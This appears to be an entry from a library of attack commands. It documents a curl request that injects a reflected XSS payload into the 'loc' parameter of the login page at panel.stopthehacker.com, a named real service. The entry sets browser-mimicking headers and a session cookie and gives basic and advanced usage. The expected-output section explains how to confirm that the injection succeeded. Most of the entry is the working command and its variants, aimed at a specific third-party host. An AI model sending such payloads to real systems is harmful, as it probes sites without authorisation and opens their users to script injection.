---
data: >-
  curl -X GET
  "https://panel.stopthehacker.com/login/?loc=de%22%3E%3Cscript%3Eprompt(994787)%3C/script%3E"
  -H "Referer: https://panel.stopthehacker.com" -H "Cookie:
  sth_panel=9fj5MyELdr2SAJ3yNP5p%2C3" -H "Host: panel.stopthehacker.com" -H
  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
  like Gecko) Chrome/28.0.1500.63 Safari/537.36" -v
tags:
  - xss
  - web-exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c161cdce-841d-42b9-b107-9de129d2a8d1
created_at: '2025-12-14T03:16:14.668Z'
updated_at: '2025-12-14T03:16:14.668Z'
verified: false
validated: true
submitted: true
---
# curl-xss-injection-stopthehacker

## Command

```bash
curl -X GET "https://panel.stopthehacker.com/login/?loc=de%22%3E%3Cscript%3Eprompt(994787)%3C/script%3E" \
  -H "Referer: https://panel.stopthehacker.com" \
  -H "Cookie: sth_panel=9fj5MyELdr2SAJ3yNP5p%2C3" \
  -H "Host: panel.stopthehacker.com" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36" \
  -v
```

## Description

This curl command sends a malicious GET request to the StopTheHacker panel's login endpoint with a reflected XSS payload in the 'loc' parameter, including headers to mimic a legitimate browser request. Use it to test or demonstrate the vulnerability by checking if the payload is reflected unsanitized in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `URL with ?loc=...` | The target endpoint with encoded XSS payload | Yes |
| `-H "Referer: ..."` | Sets the Referer header to the panel domain | Yes |
| `-H "Cookie: ..."` | Includes a sample session cookie | No (for testing) |
| `-H "Host: ..."` | Sets the Host header | Yes |
| `-H "User-Agent: ..."` | Mimics a specific browser User-Agent | Yes |
| `-v` | Verbose output to show request/response details | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://panel.stopthehacker.com/login/?loc=de%22%3E%3Cscript%3Eprompt(994787)%3C/script%3E" -v
```

### Advanced Usage

```bash
curl -X GET "https://panel.stopthehacker.com/login/?loc=de%22%3E%3Cscript%3Eprompt(994787)%3C/script%3E" \
  -H "Referer: https://panel.stopthehacker.com" \
  -H "Cookie: sth_panel=9fj5MyELdr2SAJ3yNP5p%2C3" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36" \
  -v > response.html
```

Save the response to a file for inspection.

## Expected Output

Verbose curl output showing the full HTTP request and response. Look for the reflected payload '<script>prompt(994787)</script>' in the HTML body without encoding, indicating successful injection. No JavaScript execution in curl itself; test in a browser for that.

## Related

- [[procedures/Inject-Reflected-XSS-Payload-into-Login-Endpoint]]
